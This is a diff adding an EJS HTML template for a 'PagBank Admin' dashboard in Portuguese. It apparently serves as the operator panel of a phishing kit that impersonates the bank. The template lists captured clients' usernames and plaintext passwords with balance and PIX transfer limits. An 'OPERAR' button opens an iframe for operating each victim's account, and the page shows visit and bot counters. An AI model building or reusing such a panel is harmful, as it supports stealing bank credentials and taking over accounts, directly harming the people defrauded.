@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard - PagBank Admin</title>
+  <link rel="stylesheet" href="/css/admin.css">
+</head>
+<body class="gh-body">
+  <!-- Header -->
+  <header class="gh-header">
+    <div class="gh-container gh-header__inner">
+      <div class="gh-header__brand">
+        <span class="gh-octicon" aria-hidden="true">📊</span>
+        <span class="gh-header__title">PagBank Admin</span>
+      </div>
+      <div class="gh-header__actions">
+        <div class="gh-user">
+          <span class="gh-user__avatar" aria-hidden="true"><%= (username || 'A').charAt(0).toUpperCase() %></span>
+          <div class="gh-user__meta">
+            <span class="gh-user__label">Logado como</span>
+            <strong class="gh-user__name"><%= username %></strong>
+          </div>
+        </div>
+        <a href="/logout" class="gh-btn gh-btn--secondary">Sair</a>
+      </div>
+    </div>
+  </header>
+
+  <main class="gh-main">
+    <div class="gh-container">
+      <!-- Subnav -->
+      <nav class="gh-subnav" aria-label="Breadcrumb">
+        <ol>
+          <li><span>PagBank</span></li>
+          <li aria-current="page">Dashboard</li>
+        </ol>
+        <div class="gh-subnav__actions">
+          <button class="gh-btn gh-btn--primary" onclick="refreshData()">Atualizar dados</button>
+        </div>
+      </nav>
+
+      <!-- Estatísticas -->
+      <section class="gh-section">
+        <header class="gh-section__header">
+          <h2>Insights rápidos</h2>
+          <span class="gh-section__hint">Resumo das últimas 24h</span>
+        </header>
+        <div class="gh-cards">
+          <article class="gh-card">
+            <header>Total de hoje</header>
+            <strong><%= stats.totalClientes %></strong>
+          </article>
+          <article class="gh-card">
+            <header>Clientes clientes</header>
+            <strong><%= stats.clientesHoje %></strong>
+          </article>
+          <article class="gh-card">
+            <header>Total de hoje</header>
+            <strong><%= stats.visitasHoje %></strong>
+          </article>
+          <article class="gh-card">
+            <header>Visitas visitas</header>
+            <strong><%= stats.totalVisitas %></strong>
+          </article>
+          <article class="gh-card">
+            <header>Bots</header>
+            <strong>0</strong>
+          </article>
+        </div>
+      </section>
+
+      <!-- Lista de Clientes -->
+      <section class="gh-section">
+        <header class="gh-section__header">
+          <div>
+            <h2>Clientes cadastrados</h2>
+            <span class="gh-section__hint"><%= clientes.length %> resultados</span>
+          </div>
+        </header>
+
+        <div class="gh-panel">
+          <div class="gh-panel__table">
+            <table>
+              <thead>
+                <tr>
+                  <th>Usuário</th>
+                  <th>Senha</th>
+                  <th>Saldo</th>
+                  <th>Data cadastro</th>
+                  <th>Ações</th>
+                </tr>
+              </thead>
+              <tbody>
+                <% if (clientes && clientes.length > 0) { %>
+                  <% clientes.forEach(cliente => { %>
+                    <tr>
+                      <td data-label="Usuario" width="200">
+                        <code><%= cliente.username %></code>
+                      </td>
+                      <td data-label="Nome"  width="100"><%= cliente.password || '—' %></td>
+                      <td data-label="Logins" class="gh-number">
+                        Conta: R$ | Limite: PIX R$ 0, TEF/TED: R$ 0
+                      </td>
+                      <td data-label="Data cadastro"><time datetime="<%= cliente.createdAt %>"><%= new Date(cliente.createdAt).toLocaleDateString('pt-BR') %></time></td>
+                      <td data-label="" width="240">
+                        <button class="gh-btn gh-btn--primary gh-btn--small" onclick="openOperarModal('<%= cliente.username %>')">OPERAR</button>
+                        <button class="gh-btn gh-btn--danger gh-btn--small">REMOVER</button>
+                      </td>
+                    </tr>
+                  <% }); %>
+                <% } else { %>
+                  <tr>
+                    <td colspan="8" class="gh-empty">Nenhum cliente cadastrado</td>
+                  </tr>
+                <% } %>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer class="gh-footer">
+    <div class="gh-container">
+      <p>&copy; 2025 PagBank Admin. Inspirado na experiência GitHub.</p>
+    </div>
+  </footer>
+
+  <!-- Modal para Operar -->
+  <div id="modal-operar" class="gh-modal">
+    <div class="gh-modal__content">
+      <div class="gh-modal__header">
+        <h3>Operar Cliente: <span id="modal-cliente-username"></span></h3>
+        <button class="gh-modal__close" onclick="closeModal()">&times;</button>
+      </div>
+      <div class="gh-modal__body">
+        <iframe id="operar-iframe" src="http://localhost:46805/" width="100%" height="800px" frameborder="0"></iframe>
+      </div>
+      <div class="gh-modal__footer">
+        <button class="gh-btn gh-btn--secondary" onclick="closeModal()">Fechar</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/dashboard.js"></script>
+</body>
+</html>
